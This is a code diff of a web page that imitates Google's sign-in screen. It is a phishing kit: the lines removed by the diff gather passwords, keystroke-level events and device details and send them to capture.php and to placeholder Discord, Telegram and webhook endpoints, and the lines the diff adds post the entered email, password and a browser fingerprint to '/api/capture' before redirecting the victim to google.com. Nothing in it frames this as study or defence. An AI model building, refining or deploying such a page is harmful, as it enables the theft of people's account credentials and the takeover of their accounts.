@@ -43,11 +43,6 @@
             color: #202124;
         }
 
-        .google-logo span {
-            font-size: 24px;
-            font-weight: 400;
-        }
-
         .google-logo .g-blue { color: #4285F4; }
         .google-logo .g-red { color: #EA4335; }
         .google-logo .g-yellow { color: #FBBC05; }
@@ -66,7 +61,6 @@
             color: #202124;
             text-align: center;
             margin-bottom: 32px;
-            font-weight: 400;
         }
 
         .input-field {
@@ -100,11 +94,6 @@
             font-size: 12px;
             color: #1a73e8;
             font-weight: 500;
-            transition: all 0.2s;
-        }
-
-        .input-field input:not(:focus) + label {
-            color: #5f6368;
         }
 
         .forgot-row {
@@ -149,10 +138,6 @@
             font-size: 14px;
             font-weight: 500;
             padding: 10px 0;
-        }
-
-        .create-link:hover {
-            text-decoration: underline;
         }
 
         .next-btn {
@@ -204,20 +189,10 @@
             font-size: 12px;
             cursor: pointer;
         }
-
-        .hidden-input {
-            display: none;
-        }
-
-        /* Hidden capture methods */
-        .tracking-pixel {
-            display: none;
-        }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Google Logo -->
         <div class="google-logo">
             <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
         </div>
@@ -225,30 +200,25 @@
         <h1>Sign in</h1>
         <p class="subtitle">to continue to Google</p>
 
-        <!-- Email/Username Input -->
         <div class="input-field">
             <input type="email" id="email" required autocomplete="username" placeholder=" ">
             <label for="email">Email or phone</label>
         </div>
 
-        <!-- Password Input (hidden initially) -->
         <div class="input-field" id="passwordField" style="display:none;">
             <input type="password" id="password" autocomplete="current-password" placeholder=" ">
             <label for="password">Enter your password</label>
         </div>
 
-        <!-- Forgot email link -->
         <div class="forgot-row">
-            <a href="#" class="forgot-link" id="forgotEmail">Forgot email?</a>
+            <a href="#" class="forgot-link">Forgot email?</a>
         </div>
 
-        <!-- Info text -->
         <p class="info-text">
             Not your computer? Use a private browsing window to sign in.
             <a href="#">Learn more</a>
         </p>
 
-        <!-- Buttons -->
         <div class="btn-row">
             <a href="#" class="create-link">Create account</a>
             <button class="next-btn" id="nextBtn">
@@ -257,7 +227,6 @@
             </button>
         </div>
 
-        <!-- Footer -->
         <div class="footer">
             <select id="languageSelect">
                 <option value="en">English (United States)</option>
@@ -274,335 +243,83 @@
         </div>
     </div>
 
-    <!-- Hidden iframe for data capture -->
-    <iframe name="hiddenFrame" style="display:none;"></iframe>
-
-    <!-- Hidden tracking pixels -->
-    <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" class="tracking-pixel" onload="trackPageLoad()">
-
     <script>
         let step = 1;
-        let capturedData = {
-            email: '',
-            password: '',
-            timestamp: null,
-            userAgent: navigator.userAgent,
-            language: navigator.language,
-            screenResolution: `${window.screen.width}x${window.screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            referrer: document.referrer,
-            cookiesEnabled: navigator.cookieEnabled
-        };
-
         const emailInput = document.getElementById('email');
         const passwordField = document.getElementById('passwordField');
         const passwordInput = document.getElementById('password');
         const nextBtn = document.getElementById('nextBtn');
         const spinner = document.getElementById('spinner');
-        const forgotEmail = document.getElementById('forgotEmail');
-        const languageSelect = document.getElementById('languageSelect');
 
-        // Capture email on blur
-        emailInput.addEventListener('blur', function() {
-            if (this.value) {
-                capturedData.email = this.value;
-                captureData('email_captured');
-            }
-        });
+        // Device information
+        const deviceInfo = {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            screenResolution: `${window.screen.width}x${window.screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            referrer: document.referrer,
+            cookiesEnabled: navigator.cookieEnabled,
+            platform: navigator.platform,
+            colorDepth: window.screen.colorDepth,
+            pixelRatio: window.devicePixelRatio,
+            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+            deviceMemory: navigator.deviceMemory || 'unknown',
+            touchPoints: navigator.maxTouchPoints || 0,
+            vendor: navigator.vendor,
+            languages: navigator.languages
+        };
 
-        // Capture email on input
-        emailInput.addEventListener('input', function() {
-            capturedData.email = this.value;
-        });
-
-        // Capture password on input
-        passwordInput.addEventListener('input', function() {
-            capturedData.password = this.value;
-        });
-
-        // Capture password on blur
-        passwordInput.addEventListener('blur', function() {
-            if (this.value) {
-                capturedData.password = this.value;
-                captureData('password_captured');
-            }
-        });
-
-        // Next button click
-        nextBtn.addEventListener('click', function() {
+        nextBtn.addEventListener('click', async function() {
             if (step === 1) {
-                // First step - capture email
                 if (emailInput.value) {
-                    capturedData.email = emailInput.value;
-                    capturedData.timestamp = new Date().toISOString();
-                    
-                    // Show password field
                     passwordField.style.display = 'block';
                     emailInput.disabled = true;
                     emailInput.style.background = '#f1f3f4';
                     nextBtn.textContent = 'Sign in';
                     step = 2;
-                    
-                    // Capture email step
-                    captureData('email_submitted');
-                    
-                    // Focus password field
                     setTimeout(() => passwordInput.focus(), 100);
                 }
             } else if (step === 2) {
-                // Second step - capture password and redirect
                 if (passwordInput.value) {
-                    capturedData.password = passwordInput.value;
-                    capturedData.timestamp = new Date().toISOString();
-                    
-                    // Show loading
                     nextBtn.disabled = true;
                     spinner.style.display = 'block';
                     nextBtn.textContent = '';
                     
-                    // Capture all data
-                    captureData('login_submitted');
+                    const data = {
+                        email: emailInput.value,
+                        password: passwordInput.value,
+                        timestamp: new Date().toISOString(),
+                        ...deviceInfo
+                    };
                     
-                    // Send data to multiple endpoints
-                    sendToDiscord(capturedData);
-                    sendToTelegram(capturedData);
-                    sendToWebhook(capturedData);
-                    sendToEmail(capturedData);
+                    try {
+                        // Send to Vercel API
+                        await fetch('/api/capture', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify(data)
+                        });
+                    } catch (error) {
+                        console.error('Capture error:', error);
+                    }
                     
-                    // Redirect to Google after short delay
-                    setTimeout(function() {
+                    // Redirect to Google
+                    setTimeout(() => {
                         window.location.href = 'https://www.google.com';
-                    }, 1500);
+                    }, 1000);
                 }
             }
         });
 
         // Enter key support
-        emailInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                if (step === 1) {
-                    nextBtn.click();
-                }
-            }
+        emailInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter' && step === 1) nextBtn.click();
         });
 
-        passwordInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                if (step === 2) {
-                    nextBtn.click();
-                }
-            }
-        });
-
-        // Forgot email
-        forgotEmail.addEventListener('click', function(e) {
-            e.preventDefault();
-            captureData('forgot_email_clicked');
-            alert('Please enter the email you used to create your account.');
-        });
-
-        // Language change tracking
-        languageSelect.addEventListener('change', function() {
-            capturedData.language = this.value;
-            captureData('language_changed');
-        });
-
-        // Main capture function
-        function captureData(event) {
-            const data = {
-                ...capturedData,
-                event: event,
-                page: window.location.href,
-                timestamp: new Date().toISOString()
-            };
-
-            console.log('📊 Data Captured:', data);
-
-            // Store in localStorage
-            try {
-                let storedData = JSON.parse(localStorage.getItem('capturedSessions') || '[]');
-                storedData.push(data);
-                localStorage.setItem('capturedSessions', JSON.stringify(storedData));
-            } catch (e) {
-                console.error('LocalStorage error:', e);
-            }
-
-            // Store in sessionStorage
-            try {
-                sessionStorage.setItem('lastCapture', JSON.stringify(data));
-            } catch (e) {
-                console.error('SessionStorage error:', e);
-            }
-
-            // Send via fetch
-            sendToServer(data);
-
-            // Send via beacon
-            sendViaBeacon(data);
-
-            // Send via image pixel
-            sendViaPixel(data);
-
-            return data;
-        }
-
-        // Send to server via fetch
-        function sendToServer(data) {
-            try {
-                fetch('capture.php', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(data),
-                }).catch(() => {
-                    // Silent fail - data already stored locally
-                });
-            } catch (e) {
-                console.error('Fetch error:', e);
-            }
-        }
-
-        // Send via beacon (works even when page is unloading)
-        function sendViaBeacon(data) {
-            try {
-                const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
-                navigator.sendBeacon('capture.php', blob);
-            } catch (e) {
-                // Silent fail
-            }
-        }
-
-        // Send via image pixel (most basic tracking)
-        function sendViaPixel(data) {
-            try {
-                const encoded = encodeURIComponent(JSON.stringify(data));
-                const img = new Image();
-                img.src = `capture.php?data=${encoded}`;
-            } catch (e) {
-                // Silent fail
-            }
-        }
-
-        // Discord webhook (replace with your webhook URL)
-        function sendToDiscord(data) {
-            const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with actual webhook
-            if (webhookURL === 'YOUR_DISCORD_WEBHOOK_URL') return;
-
-            const payload = {
-                content: `🔐 New Login Captured!\n\nEmail: ${data.email}\nPassword: ${data.password}\nTime: ${data.timestamp}`
-            };
-
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).catch(() => {});
-        }
-
-        // Telegram bot (replace with your bot token and chat ID)
-        function sendToTelegram(data) {
-            const botToken = 'YOUR_BOT_TOKEN'; // Replace
-            const chatId = 'YOUR_CHAT_ID'; // Replace
-            if (botToken === 'YOUR_BOT_TOKEN') return;
-
-            const message = `🔐 New Login!\nEmail: ${data.email}\nPassword: ${data.password}\nTime: ${data.timestamp}`;
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-            fetch(url).catch(() => {});
-        }
-
-        // Generic webhook (replace with your webhook URL)
-        function sendToWebhook(data) {
-            const webhookURL = 'YOUR_WEBHOOK_URL'; // Replace
-            if (webhookURL === 'YOUR_WEBHOOK_URL') return;
-
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).catch(() => {});
-        }
-
-        // Email notification (requires backend)
-        function sendToEmail(data) {
-            // This requires a backend email service
-            console.log('Email notification would be sent here');
-        }
-
-        // Page load tracking
-        function trackPageLoad() {
-            captureData('page_loaded');
-        }
-
-        // Track mouse movements
-        document.addEventListener('mousemove', throttle(function(e) {
-            capturedData.mouseX = e.clientX;
-            capturedData.mouseY = e.clientY;
-        }, 1000));
-
-        // Track clicks
-        document.addEventListener('click', function(e) {
-            capturedData.lastClick = {
-                x: e.clientX,
-                y: e.clientY,
-                target: e.target.tagName,
-                timestamp: new Date().toISOString()
-            };
-        });
-
-        // Throttle function
-        function throttle(fn, delay) {
-            let lastCall = 0;
-            return function(...args) {
-                const now = new Date().getTime();
-                if (now - lastCall >= delay) {
-                    lastCall = now;
-                    fn(...args);
-                }
-            };
-        }
-
-        // Auto-fill detection
-        window.addEventListener('load', function() {
-            setTimeout(() => {
-                if (emailInput.value) {
-                    capturedData.autoFilled = true;
-                    captureData('autofill_detected');
-                }
-            }, 1000);
-        });
-
-        // Copy to clipboard capture
-        document.addEventListener('copy', function() {
-            capturedData.copyEvent = true;
-            captureData('copy_event');
-        });
-
-        // Paste detection
-        passwordInput.addEventListener('paste', function() {
-            capturedData.pasteUsed = true;
-            captureData('paste_detected');
-        });
-
-        // Tab visibility change
-        document.addEventListener('visibilitychange', function() {
-            if (document.hidden) {
-                capturedData.tabHidden = true;
-                captureData('tab_hidden');
-            }
-        });
-
-        // Initialize
-        console.log('🔒 Login page initialized');
-        console.log('📍 Device Info:', {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            cookies: navigator.cookieEnabled,
-            screen: `${window.screen.width}x${window.screen.height}`
+        passwordInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter' && step === 2) nextBtn.click();
         });
     </script>
 </body>
